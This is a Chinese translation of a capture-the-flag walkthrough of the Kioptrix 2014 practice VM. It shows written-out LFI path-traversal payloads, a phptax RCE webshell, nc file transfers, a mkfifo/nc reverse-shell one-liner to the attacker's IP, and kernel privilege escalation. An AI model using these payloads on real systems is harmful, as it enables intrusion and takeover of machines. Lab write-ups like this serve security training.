<html>
<head>
<title>Kioptrix 2014</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Kioptrix 2014</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/kioptrix-2014-c5b1f5144fc9?source=collection_archive---------0-----------------------#2018-03-31">https://infosecwriteups.com/kioptrix-2014-c5b1f5144fc9?source=collection_archive---------0-----------------------#2018-03-31</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/bb0430c05a4baf20f88b7b14504a282c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gpQR_SFJptTpIzCp6YfeYA.png"/></div></div></figure><h1 id="f794" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">摘要</h1><p id="7946" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">Kioptrix 2014是一个运行在FreeBSD上的Apache web服务器。<br/>它托管一个易受本地文件包含攻击的web应用程序，该应用程序用于枚举和公开另一个web应用程序。<br/>额外的webapp易受远程代码执行的攻击，该代码用于删除webshell并生成反向shell。一旦进入系统，两个内核漏洞被成功用于获得根用户访问权限。</p><h1 id="31a4" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">侦察/扫描</h1><p id="ee6c" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我最初的侦察是对本地网络进行arp扫描，以便用<code class="fe lu lv lw lx b">netdiscover</code>快速返回目标在我私有范围内的IP地址。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="2ffb" class="mg jz iq lx b gy mh mi l mj mk">netdiscover -r 192.168.15.0/24</span></pre><blockquote class="ml mm mn"><p id="5b37" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-r指定网络范围</p></blockquote><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">网络发现</figcaption></figure><p id="3503" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">接下来，我用一个<code class="fe lu lv lw lx b">nmap</code>扫描枚举了主机上的服务</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="f585" class="mg jz iq lx b gy mh mi l mj mk">nmap -sV -sC 192.168.15.150</span></pre><blockquote class="ml mm mn"><p id="6cea" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-sV探测开放端口以确定服务/版本信息<br/> -sC运行默认脚本</p></blockquote><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">nmap</figcaption></figure><p id="b668" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我们可以看到在运行<strong class="ky ir"> Apache </strong>的<strong class="ky ir"> FreeBSD </strong>主机上打开了两个web端口</p><p id="aa1c" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">接下来，我尝试使用<code class="fe lu lv lw lx b">dirb</code>和<code class="fe lu lv lw lx b">gobuster</code>来枚举网络目录</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="30ad" class="mg jz iq lx b gy mh mi l mj mk">dirb <a class="ae nd" href="http://192.168.15.150" rel="noopener ugc nofollow" target="_blank">http://192.168.15.150</a></span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">dirb端口80</figcaption></figure><blockquote class="ml mm mn"><p id="8afc" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">403 =禁止<br/> 200 =正常</p></blockquote><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/e59e627cc4942187eefc6e5804ba8975.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*80e5G2MPtuZgKVNgacCY1Q.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">index.html</figcaption></figure><p id="e981" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated"><code class="fe lu lv lw lx b">index.html</code>似乎是默认网页</p><p id="18d4" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">此扫描没有产生太多…让我们检查端口8080</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="8893" class="mg jz iq lx b gy mh mi l mj mk">dirb <a class="ae nd" href="http://192.168.15.150:8080" rel="noopener ugc nofollow" target="_blank">http://192.168.15.150:8080</a></span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">dirb端口8080</figcaption></figure><p id="d68d" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">这次又不多了。</p><p id="edce" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">在这一点上，我想用另一个工具来验证信息的缺乏。<br/>我选了<code class="fe lu lv lw lx b">gobuster</code>。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="e470" class="mg jz iq lx b gy mh mi l mj mk">gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="ae nd" href="http://192.168.15.150" rel="noopener ugc nofollow" target="_blank">http://192.168.15.150</a> -s 200,204,301,302,307,403</span></pre><blockquote class="ml mm mn"><p id="14ca" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-w指定一个单词列表(Kali有几个内置)<br/> -u指定一个URL <br/> -s指定响应寻找<br/> 200，204，301，302，307默认；由于dirb结果，我添加了403</p></blockquote><p id="85d8" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">该扫描运行了几分钟，但没有结果。</p><p id="3927" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">使用相同的扫描移动到端口8080…</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="862c" class="mg jz iq lx b gy mh mi l mj mk">gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="ae nd" href="http://192.168.15.150:8080" rel="noopener ugc nofollow" target="_blank">http://192.168.15.150:8080</a> -s 200,204,301,302,307,403</span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">gobuster 8080</figcaption></figure><p id="8a53" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">几乎单词列表中的每一行都返回禁止的响应——这也很容易在浏览器中验证。</p><p id="f5c1" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">这里发生了一些奇怪的事情…</p><p id="eecf" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">最后，我运行一个<code class="fe lu lv lw lx b">nikto</code>扫描来列举任何已知的漏洞。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="2c74" class="mg jz iq lx b gy mh mi l mj mk">nikto -h 192.168.15.150</span></pre><blockquote class="ml mm mn"><p id="0e48" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-h指定主机</p></blockquote><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">nikto 80</figcaption></figure><p id="2c9e" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">端口8080上的结果非常相似。</p><p id="11e2" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">仔细看，我们发现<strong class="ky ir"> mod_ssl </strong>已经过时了。</p><p id="43c9" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我发现了这个服务和版本的一个漏洞，看起来它应该可以工作，但我从未利用过这个漏洞…可能是一些需要重新审视的东西。</p><p id="9167" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">在这一点上，似乎没有太多的工作要做，所以我重新访问默认的登录页面并查看页面的属性。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/0558e913a9f689dd5f8c48aeee483118.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X2Fcn75FRx86DwWDH0XWiQ.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">pChart2.1.3/index.php</figcaption></figure><p id="931e" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">没有太多其他的东西可戳，所以我尝试访问属性中列出的URL。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/0c44362e1abb9ef3277e673ab911e5d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8CRTQdIsNPRCwxL4XRZ4tQ.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">pChart 2.1.3</figcaption></figure><p id="7264" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我们还有一个网页！</p><h1 id="ee80" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">初始利用</h1><p id="e165" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><code class="fe lu lv lw lx b">searchsploit</code>返回了此webapp的两个漏洞:</p><ol class=""><li id="7d40" class="ng nh iq ky b kz mp ld mq lh ni ll nj lp nk lt nl nm nn no bi translated">本地文件包含</li><li id="d78f" class="ng nh iq ky b kz np ld nq lh nr ll ns lp nt lt nl nm nn no bi translated">跨站点脚本</li></ol><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">普哈特·LFI</figcaption></figure><p id="9cba" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我能够用这个例子来验证LFI:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="a38a" class="mg jz iq lx b gy mh mi l mj mk">/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</span></pre><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/27f4d7b1a22b4269ea4247e72ddfacdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0C_liEcuTCorLWB40s0qsg.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">/etc/密码</figcaption></figure><p id="ab77" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">根据<a class="ae nd" href="https://www.freebsd.org/doc/handbook/network-apache.html" rel="noopener ugc nofollow" target="_blank"> FreeBSD文档</a>，Apache配置文件位于<code class="fe lu lv lw lx b">/usr/local/etc/apache2x/httpd.conf</code>，因为我们从扫描中知道主机运行的是Apache 2.2，所以查看文件的路径是:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="fc3e" class="mg jz iq lx b gy mh mi l mj mk">/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</span></pre><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/7b557ccb89faa983723d6b0c5dd8eff1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Kj9Dmv43T8mpeur_59DpVQ.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">httpd.conf</figcaption></figure><p id="c434" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我们可以看到端口8080只允许Mozilla4用户代理——这就是我们之前一直被阻塞的原因！</p><p id="ef7e" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">Mozilla/4.0是<a class="ae nd" href="https://blogs.msdn.microsoft.com/ieinternals/2013/09/21/internet-explorer-11s-many-user-agent-strings/" rel="noopener ugc nofollow" target="_blank">微软的兼容性视图和Internet Explorer 7的用户代理字符串</a>。</p><p id="58f9" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我本打算在浏览器中更改这一点，但后来我遇到了这个…</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/907faae5986eac85b5c84c2f8a5020f8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pe8pDhA0E5WKh5lOooB46A.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">不</figcaption></figure><p id="5123" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我决定用<code class="fe lu lv lw lx b">burpsuite</code>来代替。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/36c1365752f6555ae00ec15cfc053d03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q0UmBIzzMaVkcjnfyBcslQ.png"/></div></div></figure><p id="0570" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">这是非常琐碎的，但是我不想让拦截保持打开，并手动编辑每个请求。</p><p id="b87f" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我没必要这么做！</p><p id="900f" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated"><code class="fe lu lv lw lx b">burpsuite</code>有一个内置的<code class="fe lu lv lw lx b">Proxy &gt; Options</code>下的“匹配和替换”功能，在我的历史中有了改变。我所要做的就是告诉burp通过勾选一个框来继续为我做这件事！</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/c3cc8f0d1dac7b1c086d6d9a2c29aea7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uH4Eb9LAV5ernAATqo7GWQ.png"/></div></div></figure><p id="a1c9" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">现在我可以到达8080端口了！</p><div class="ly lz ma mb gt ab cb"><figure class="nu jr nv nw nx ny nz paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><img src="../Images/c63204baff49f0ab693b2c996e98ac66.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/format:webp/1*wl6C0Y3H_D8tfFvu7rSb8Q.png"/></div></figure><figure class="nu jr oa nw nx ny nz paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><img src="../Images/4ef2cb0cc5f86c2461e14f95e5104c4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*DEUtzbQw63z9Dfp_Yy55fQ.png"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk ob di oc od translated">phptax</figcaption></figure></div><h1 id="b18a" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">得到一个壳</h1><p id="94e6" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">让我们看看<code class="fe lu lv lw lx b">searchsploit</code>是否知道这件事。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/e2627b8bc8b2fb735a03cefdeb556b2d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TaUWLWhONrMlphXK5hyO1w.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">searchsploit phptax</figcaption></figure><p id="4438" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">太棒了。马上，我们看到有一个metasploit模块。我将检查其他两个选项，以尝试自动化程度较低的利用方式。</p><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="mx my l"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">phptax RCE</figcaption></figure><p id="2010" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">为了让dropper执行，我必须安装一个php curl库并重启apache</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="ee28" class="mg jz iq lx b gy mh mi l mj mk">$ apt-get install php7.0-curl<br/>$ /etc/init.d/apache2 restart</span></pre><p id="89eb" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">然后我就可以放下webshell了。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="9e4d" class="mg jz iq lx b gy mh mi l mj mk">$ php shell.php -u <a class="ae nd" href="http://192.168.15.150:8080/phptax" rel="noopener ugc nofollow" target="_blank">http://192.168.15.150:8080/phptax</a></span></pre><blockquote class="ml mm mn"><p id="1835" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-u指定主机</p></blockquote><p id="1662" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">这个脚本将一个<code class="fe lu lv lw lx b">rce.php</code> webshell放到了<code class="fe lu lv lw lx b">/phptax/data/</code>目录中。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/ac25d08e4c4d2ac301c65689d4488cac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lrSrfD2FFYmKyYVYGY5ulg.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">rce.php</figcaption></figure><p id="501d" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">接下来，我使用了一个包含在Kali】下的反向shell，但也在这里找到了<a class="ae nd" href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="0686" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated"><code class="fe lu lv lw lx b">wget</code>和<code class="fe lu lv lw lx b">curl</code>不在服务器上，所以我用我的webshell用<code class="fe lu lv lw lx b">nc</code>把文件拖到服务器上。</p><p id="57da" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">在我的盒子上:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="9516" class="mg jz iq lx b gy mh mi l mj mk">$ nc -lvp 1234 &lt; php-reverse-shell.php</span></pre><blockquote class="ml mm mn"><p id="05cd" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">-l监听连接<br/> -v表示详细连接<br/> -p指定端口<br/> &lt;以在连接时打印文件内容</p></blockquote><p id="8f92" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">在webshell中:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="c1bb" class="mg jz iq lx b gy mh mi l mj mk">/rce.php?cmd=nc 192.168.15.141 1234 &gt; php-reverse-shell.php</span></pre><blockquote class="ml mm mn"><p id="88b7" class="kw kx mo ky b kz mp lb lc ld mq lf lg mr ms lj lk mt mu ln lo mv mw lr ls lt ij bi translated">若要将传入的数据导入服务器上的新文件中</p></blockquote><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/2413cb980b33d8795fe6627e0ab1121f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lyVAlkAyCVqZnTXejRDlOg.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">NC php-reverse-shell.php</figcaption></figure><p id="3390" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">反向外壳可以通过在浏览器中调用它的路径来调用。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="f4b0" class="mg jz iq lx b gy mh mi l mj mk">http://192.168.15.150:8080/phptax/data/php-reverse-shell.php</span></pre><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/e5a7d73d973c0a3de54a08634b4b289d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iRMJqUwunKNS1YxeszvHHg.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">反向外壳</figcaption></figure><p id="dbbb" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">我还找到了一种不用另一个文件就能获得反向shell的方法。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="5bd2" class="mg jz iq lx b gy mh mi l mj mk">mkfifo pipe;nc 192.168.15.141 1234&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</span></pre><p id="74cb" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">这类似于<a class="ae nd" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> PentestMonkey </a>的反向外壳——我无法工作。这一行中发生的事情是，我们使用一个名为<code class="fe lu lv lw lx b">pipe</code>的FIFO命名管道通过端口1234将<code class="fe lu lv lw lx b">/bin/sh</code>发送到我们的机器。命名管道为运行在同一台机器上的进程之间或局域网上的两台机器之间的进程间通信提供了一种方式。在这种情况下，无论什么时候输出到<code class="fe lu lv lw lx b">/bin/sh</code>，它都会被<code class="fe lu lv lw lx b">pipe</code>通过nc重定向到我们的终端。</p><h1 id="6726" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">权限提升</h1><p id="6e5b" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated"><code class="fe lu lv lw lx b">uname -a</code>显示主机是FreeBSD 9.0版本。</p><p id="7bc8" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated"><code class="fe lu lv lw lx b">searchsploit</code>有两个针对本地权限提升的内核漏洞。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nf"><img src="../Images/71db7253d2a0d5e3a0ce5d0eb6ff6a30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nw3ssmFXkox5bVqZw8OzrQ.png"/></div></div><figcaption class="mz na gj gh gi nb nc bd b be z dk translated">searchsploit privesc</figcaption></figure><p id="8594" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">服务器已经安装了<code class="fe lu lv lw lx b">gcc</code>，所以我将尝试在本地编译文件。<br/>我使用<code class="fe lu lv lw lx b">nc</code>将文件放在服务器上，确切地说是反向shell是如何传输的。</p><div class="ly lz ma mb gt ab cb"><figure class="nu jr oe nw nx ny nz paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><img src="../Images/011b8bea9dcf245092fe64799f388d69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1138/format:webp/1*JQ6F8lByRBDPHDjb2z5LaQ.png"/></div></figure><figure class="nu jr of nw nx ny nz paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><img src="../Images/dd7e65f4e11ce16aae46d22fa8fe0209.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/1*M-xPEdxlWIOa1hSTog86bA.png"/></div><figcaption class="mz na gj gh gi nb nc bd b be z dk og di oh od translated">根x2</figcaption></figure></div><p id="87d6" class="pw-post-body-paragraph kw kx iq ky b kz mp lb lc ld mq lf lg lh ms lj lk ll mu ln lo lp mw lr ls lt ij bi translated">两个内核都利用了生成的根外壳！从这里我们可以看到旗帜。</p></div></div>    
</body>
</html>